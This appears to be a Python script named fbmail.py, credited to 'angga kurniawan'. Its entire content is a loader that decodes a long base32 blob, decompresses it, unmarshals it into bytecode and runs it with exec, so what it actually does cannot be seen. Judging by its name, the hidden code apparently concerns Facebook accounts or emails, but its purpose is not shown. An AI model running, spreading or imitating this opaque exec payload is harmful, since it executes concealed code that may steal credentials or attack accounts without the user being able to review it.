# author : angga kurniawan
# user/anggaxd/avsid/fbmail.py
# language python3

import marshal,zlib,base64
exec(marshal.loads(zlib.decompress(base64.b32decode(b'PCOO2V65N7N4QEO74WLSSWLRDQTU33C6ODS3KSLBGU5MTNRMHPE2KQI43NENEK646TRPN3TYC6YDI5ZF2ELESZNZHTMYEDAUKUANWBIO7V6MZA65Q4BPOL7RWF64UX2QUBAIDTROEXD3DHJ466QRIOFTXOOPTTPO5TWOZ2E75DKKHQH3ADPPQMZAAQI5YQTWY2YY2JKXNRCXFVOWQAVS2PJQNQBSHIW2ENCCH6SLMSN4IIBDYBZTIT6MFWC23UK4D6AQI7UGRK45PQWKLII2OI6MBWER74XEO4MKD7AHL7GX44VHCZMPAOGHR5UMXPRFD5DXIM6JAUQVTENCQJNMLCTF6XQK2CDBM7NCTQWHJRZD4EECCUTRHF7ND3UMRTTPAQD22TFSDLEFCOPGBS7JZ3AI5RGHELQQMOMTKUDQUTQ4VV4OKMJJ23BQSNOAZPQ2ND6OHN37DOGDZN4WCLPIZGDV25NAUGYN275DIYNB553NZ4D5HKHXZ7RY3EAJ2JXH5X4G5JOS6B4THWJIPNIVA4IFZQ3HTH72HJ2YLS6OK77SN5UJU6OIQAQD3ZIXRF2FET6B2SHXV463ZAU6757FOIMYFBCO2INC6UKKFC45E3TKXXFOJJZLWGSHTO4KP5KUSL7VNWOVXFZKRESRV327ITN5R6HRIRVYIEFNAR35BRKOTY52OIK5UGDC4PCZ6XYY4RBE6PY4HFBGI3AKNUM4YAHJRPXZN7Q4QUC5DRXIJMKCUX2ARRBHJDNPOUV5LWWMYLWVVLJ2XM4HP67G4LZMEXH5WZD67VAX443WNIJZ57G44VJ5N6XDUX25OTT532U4VX66ZWJP2ZJDYZ7LGR2H55OMK36SQTXRVRWVL25VLKWX5Z2OPVRWDNXOSFC5PHPR43T6XNO36XNNYHFNF4KHG5WB6U6BVRYOR63GRGA26WEAKLVXI5R3FZL4INM6YR3BVLJ4B5K3W3IYUPFXIVW3H3OGOETWFRCWIHFJ43GQSAZJOUZHAYOJA554FDNPE2IMT76UNNZU3SWY3D65WZP25OY63WAO64WXAIFECRBKF3CFFOIVGX6BBTUU2F3JSG6E3XOPJ2WS2JJPD26OVXXI2U2B6HZSPP26HWHIVG5R2UJ2IO665F2N5AUHYPFVRRE4EBXJZAVIA3FY6VZ7HUBVCNCTSPIROCMNPGOKUDOKKOC5DVEIVHF3YZVKY2OKKGVH3M6NLWYMJ26223OGKFMDIURNREU3G5PBSY4FLWQ5GYBOCZVLWBOBX4HCOYKMN5B3YQXMC2FKSBDKU35QQRJ5DDKLEJKLDASNIXA2O7X7GJDDKPEGE7YCINXQHDIDYNQQXMGPFXWJNQDZSB7F4BKQLHAFXUDDUQA4DVRIQZEIOTEF2V4JCJBLYH2B3RYZK235ZHEZB24SYMU6RYYD6XCPRSDA3TWOGQ7DBCE2QPWAERD7EZEUCRPKSB6KHYTILLIRW3GU24VBR7A4FWC3XALSLTYBYJ4B757R53EW7FYG3AJYBHJHS6H7BAJW7S5IP5XQT2ZKP3TJOWOVYIO7PNU7EULSCXHOVVLLVCX2ZSGTYMFZWFZWY7EDKMXZFX7MHZEBX2T5OMMZELPX62POUNGOE42UIO7UJH5BF4IL6SB6SA5OGMT7RMJXM7JNKVBJ5KS6FNHHLLYFXPV74EP4GZEMUH77T77W74HECM2NRFHKRFV4AGXQ2VWTO2FXVC26MBRUDONQ33QOMXSGLUU5DWSIWW5HKTLXPWXP2BFVNTRVXEJED7QLR6SYOOGTR6FCEL4WVTUS7C3OGOFKB4NYDBYTDVX55FU5XSZACBJWW6WQN6KHMSWNIG5XQZQ63X6IHBUACFMQZWR3AJO3MCYPTKMQDUJLVIUW5JDYE7C433SPAYIB6DJB22N5IWUOIJHEGHS3JOGFV2ZMUES6WIMLKKKNYPLXTFBZPLSH3RWVTS6M6W3M5TDMOZTGNZVMMOSUPX5HSY6HTP2FUH7XI4FLTRKYN3AKG5PGTQHHNPO7FOITPAT4BP3RZHB2OCSESGREKLUNC6IERGJ56S6LZC7X2EQ5UVZZ5ZA4FOUG6YQ4KTNBNOZHI7EJ6Y2ZCWUI6JFDTQT7KJPGRECI2QZ2QIQJH4J2RY2DKRZRPUBSPF4QCSCSKRJKKPETML742EE3CC3UH7S6ZOHTT3DN7O7KYYBVLHECRKD3INPMDZL36IFI534X37EJ22D6U6YIWATKHQZWDOHNGYGQSK6IF25S4DDALLKFHDNY3RGQ2IWDHLKYI7VKQVXOBJT2JQ45YX6HCNRB6DTL5HRZSTF5OMTK7BJXL2FRSFFRHUNLRWYO5TDBNVAQM7OGIDU5P4BYQL64OQ6XHPTQHVAVGCBIXD7ER3PBX5SK564BLSBW3RGJI3QHG6ILB2LMIMUDVHBJW3ZZSL4F4NVNQ7BJAMMY72KXGFTQFTM72KH7ARHMWSQUKJYVASSP4HZI5LKVHBCMY6QULEHSDMULS5JAK2RLEPPISOINUTLSQGYTCY2SQYFCKT34G5QCAVBCX2SQA3XOJTDPU4NN35XBX2AZEAKG3IWWR27QY6QUDU54C6CV5QQYDRJHXJE66ACAZWQT5NGUMXPSGSFFVK632RFXRRHMDRZTXDUEMZDOMX3VGNUGLMLEWAPYUZP7JAIOCT3WKOIB6C2SHTPEPKJFDQYS62YGBXFAT46EN46CWP76MPUFOZF7EDURRPBXUD2LQDS4EKSKNY4ITBYZZYRIXMSXB44CRDW3IJ66VSSTYWAKCNT4WNWET6SCQYDC4NMVTEGLYMMQSPHBIHDTS4IQ3ZWKE6JPRBENFIXXIXYMKIUMFVOFBNF4HFUX42HC74BAPZD36Q======'))))